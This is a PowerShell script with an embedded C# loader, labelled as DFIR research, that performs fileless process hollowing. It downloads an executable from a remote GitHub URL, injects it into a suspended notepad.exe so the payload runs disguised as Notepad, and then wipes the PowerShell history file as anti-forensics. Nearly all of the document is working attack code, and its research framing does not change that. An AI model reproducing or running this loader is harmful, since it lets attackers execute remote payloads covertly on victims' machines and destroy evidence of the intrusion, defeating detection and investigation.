<#
    PROJECT: Fileless Process Hollowing (FULL RunPE for PE Files)
    PURPOSE: DFIR Research - Run EXE (e.g., nyancat.exe as bin) Inside Notepad
    AUTHOR: [Your Name] + Grok Fixes
#>

# --- CONFIGURATION ---
$PayloadUrl = "https://raw.githubusercontent.com/stumbs/NotePadInjection/main/payload.bin"

# --- PART 1: THE C# LOADER (Full Hollowing Engine) ---
$Code = @"
using System;
using System.Runtime.InteropServices;
using System.Net;

public class HollowLoader {
    // --- P/Invoke Definitions ---
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment,
        string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern uint NtQueryInformationProcess(IntPtr hProcess, int processInformationClass,
        ref PROCESS_BASIC_INFORMATION processInformation, uint processInformationLength, out uint returnLength);

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr baseAddress);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer,
        uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer,
        uint dwSize, out IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint ResumeThread(IntPtr hThread);

    // --- Structures ---
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public uint cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_BASIC_INFORMATION {
        public IntPtr ExitStatus;
        public IntPtr PebBaseAddress;
        public IntPtr AffinityMask;
        public IntPtr BasePriority;
        public UIntPtr Pid;
        public UIntPtr ParentPid;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT {
        public uint ContextFlags;
        // ... (full CONTEXT is large; we only need flags and Rcx/Rip for x64)
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 32)]
        public byte[] Registers;  // Placeholder; use offsets in code
        public long Rax;
        public long Rbx;
        public long Rcx;
        public long Rdx;
        public long Rsi;
        public long Rdi;
        public long Rbp;
        public long R8;
        public long R9;
        public long R10;
        public long R11;
        public long R12;
        public long R13;
        public long R14;
        public long R15;
        public long Rip;
        // More fields omitted for brevity; full size ~1232 bytes for x64
    }

    public const uint CONTEXT_FULL = 0x100007;  // For x64

    // --- The Main Hollowing Logic ---
    public static void Execute(string url) {
        try {
            Console.WriteLine("[*] Downloading PE payload (e.g., nyancat.exe as bin)...");
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            var wc = new WebClient();
            wc.Headers.Add("User-Agent", "Mozilla/5.0");
            byte[] peBytes = wc.DownloadData(url);

            if (peBytes.Length < 2 || peBytes[0] != 0x4D || peBytes[1] != 0x5A) {
                Console.WriteLine("[-] Not a valid PE file (no MZ header).");
                return;
            }

            // Parse PE headers (simplified; assume x64)
            uint e_lfanew = BitConverter.ToUInt32(peBytes, 0x3C);
            uint optHeaderOffset = e_lfanew + 0x18;
            ulong preferredBase = BitConverter.ToUInt64(peBytes, (int)optHeaderOffset + 0x10);
            uint sizeOfImage = BitConverter.ToUInt32(peBytes, (int)optHeaderOffset + 0x38);
            uint sizeOfHeaders = BitConverter.ToUInt32(peBytes, (int)optHeaderOffset + 0x3C);
            uint entryPointRva = BitConverter.ToUInt32(peBytes, (int)optHeaderOffset + 0x10);

            // Number of sections
            ushort numSections = BitConverter.ToUInt16(peBytes, (int)e_lfanew + 0x6);

            // Data directories (for reloc)
            uint relocRva = BitConverter.ToUInt32(peBytes, (int)optHeaderOffset + 0x88);
            uint relocSize = BitConverter.ToUInt32(peBytes, (int)optHeaderOffset + 0x8C);

            Console.WriteLine("[+] PE parsed: SizeOfImage=" + sizeOfImage + ", EntryPointRVA=0x" + entryPointRva.ToString("X"));

            var si = new STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(si);
            var pi = new PROCESS_INFORMATION();

            bool success = CreateProcess(@"C:\Windows\System32\notepad.exe", null, IntPtr.Zero, IntPtr.Zero, false,
                0x4, IntPtr.Zero, null, ref si, out pi);

            if (!success) {
                Console.WriteLine("[-] CreateProcess failed: " + Marshal.GetLastWin32Error());
                return;
            }

            Console.WriteLine("[+] Notepad suspended (PID: " + pi.dwProcessId + ")");

            // Get PEB and ImageBase
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            uint retLen;
            uint status = NtQueryInformationProcess(pi.hProcess, 0, ref pbi, (uint)Marshal.SizeOf(pbi), out retLen);
            if (status != 0) {
                Console.WriteLine("[-] NtQuery failed: 0x" + status.ToString("X"));
                return;
            }

            IntPtr pebBase = pbi.PebBaseAddress;
            IntPtr imageBaseOffset = IntPtr.Add(pebBase, 0x10);  // x64 PEB ImageBase offset
            byte[] baseBytes = new byte[8];
            IntPtr read;
            ReadProcessMemory(pi.hProcess, imageBaseOffset, baseBytes, 8, out read);
            ulong originalBase = BitConverter.ToUInt64(baseBytes, 0);

            Console.WriteLine("[+] Original base: 0x" + originalBase.ToString("X"));

            // Unmap original image
            status = NtUnmapViewOfSection(pi.hProcess, (IntPtr)originalBase);
            if (status != 0) {
                Console.WriteLine("[-] Unmap failed: 0x" + status.ToString("X"));
                return;
            }

            // Allocate at preferred base (or fallback)
            IntPtr newBase = VirtualAllocEx(pi.hProcess, (IntPtr)preferredBase, sizeOfImage, 0x3000, 0x40);
            if (newBase == IntPtr.Zero) {
                Console.WriteLine("[*] Preferred base taken; allocating anywhere...");
                newBase = VirtualAllocEx(pi.hProcess, IntPtr.Zero, sizeOfImage, 0x3000, 0x40);
            }
            if (newBase == IntPtr.Zero) {
                Console.WriteLine("[-] Alloc failed: " + Marshal.GetLastWin32Error());
                return;
            }

            ulong allocatedBase = (ulong)newBase;

            Console.WriteLine("[+] New base: 0x" + allocatedBase.ToString("X"));

            // Update PE ImageBase
            Array.Copy(BitConverter.GetBytes(allocatedBase), 0, peBytes, (int)optHeaderOffset + 0x18, 8);  // OptionalHeader.ImageBase offset

            // Write headers
            IntPtr written;
            WriteProcessMemory(pi.hProcess, newBase, peBytes, sizeOfHeaders, out written);

            // Write sections
            uint sectionOffset = e_lfanew + 0x18 + 0xF8;  // NT + OptionalHeader size (x64)
            for (ushort i = 0; i < numSections; i++) {
                uint secVirtAddr = BitConverter.ToUInt32(peBytes, (int)sectionOffset + 12);
                uint secRawPtr = BitConverter.ToUInt32(peBytes, (int)sectionOffset + 20);
                uint secRawSize = BitConverter.ToUInt32(peBytes, (int)sectionOffset + 16);

                if (secRawSize > 0) {
                    byte[] sectionData = new byte[secRawSize];
                    Array.Copy(peBytes, secRawPtr, sectionData, 0, secRawSize);
                    IntPtr destAddr = IntPtr.Add(newBase, (int)secVirtAddr);
                    WriteProcessMemory(pi.hProcess, destAddr, sectionData, secRawSize, out written);
                }
                sectionOffset += 40;  // Section header size
            }

            // Handle base relocations if base changed
            ulong delta = allocatedBase - preferredBase;
            if (delta != 0 && relocSize > 0) {
                Console.WriteLine("[*] Applying relocs (delta: 0x" + delta.ToString("X") + ")");
                uint relocBlockPtr = relocRva;
                while (relocBlockPtr < relocRva + relocSize) {
                    uint pageRva = BitConverter.ToUInt32(peBytes, (int)relocBlockPtr);
                    uint blockSize = BitConverter.ToUInt32(peBytes, (int)relocBlockPtr + 4);
                    if (blockSize == 0) break;

                    for (uint offset = 8; offset < blockSize; offset += 2) {
                        ushort relocEntry = BitConverter.ToUInt16(peBytes, (int)relocBlockPtr + (int)offset);
                        ushort relocType = (ushort)(relocEntry >> 12);
                        ushort relocOffset = (ushort)(relocEntry & 0xFFF);

                        if (relocType == 0xA) {  // IMAGE_REL_BASED_DIR64
                            ulong fixupAddr = allocatedBase + pageRva + relocOffset;
                            byte[] oldValBytes = new byte[8];
                            ReadProcessMemory(pi.hProcess, (IntPtr)fixupAddr, oldValBytes, 8, out read);
                            ulong oldVal = BitConverter.ToUInt64(oldValBytes, 0);
                            ulong newVal = oldVal + delta;
                            byte[] newValBytes = BitConverter.GetBytes(newVal);
                            WriteProcessMemory(pi.hProcess, (IntPtr)fixupAddr, newValBytes, 8, out written);
                        }
                    }
                    relocBlockPtr += blockSize;
                }
            }

            // Update PEB ImageBase
            WriteProcessMemory(pi.hProcess, IntPtr.Add(imageBaseOffset, 0), BitConverter.GetBytes(allocatedBase), 8, out written);

            // Set thread context to new entry point
            CONTEXT ctx = new CONTEXT();
            ctx.ContextFlags = CONTEXT_FULL;
            GetThreadContext(pi.hThread, ref ctx);
            ctx.Rcx = (long)(allocatedBase + entryPointRva);  // x64 entry point in RCX
            SetThreadContext(pi.hThread, ref ctx);

            // Resume
            ResumeThread(pi.hThread);

            Console.WriteLine("[+] Hollowing complete! Nyan Cat should run as notepad.exe.");
        }
        catch (Exception e) {
            Console.WriteLine("[-] Error: " + e.ToString());
        }
    }
}
"@

# --- PART 2: ANTI-FORENSICS ---
function Invoke-StealthCleanup {
    # Same as before
    Write-Host "`n[*] Initiating Anti-Forensic Cleanup..." -ForegroundColor Yellow
    Set-PSReadlineOption -HistorySaveStyle SaveNothing
    $HistoryPath = (Get-PSReadlineOption).HistorySavePath
    if (Test-Path $HistoryPath) {
        try {
            Remove-Item -Path $HistoryPath -Force -ErrorAction SilentlyContinue
            Write-Host "[+] Artifact Deleted: PowerShell History file wiped." -ForegroundColor Green
        }
        catch {
            Write-Host "[-] Cleanup Failed." -ForegroundColor Red
        }
    }
}

# --- PART 3: EXECUTION ---
Write-Host "[*] Compiling Hollowing Loader..." -ForegroundColor Cyan
try {
    Add-Type -TypeDefinition $Code -Language CSharp
} catch {
    Write-Error "Compilation Failed: $_"
    exit
}

[HollowLoader]::Execute($PayloadUrl)

Invoke-StealthCleanup

Write-Host "`n[!] Script Finished." -ForegroundColor Cyan
Read-Host "Press ENTER to close..."
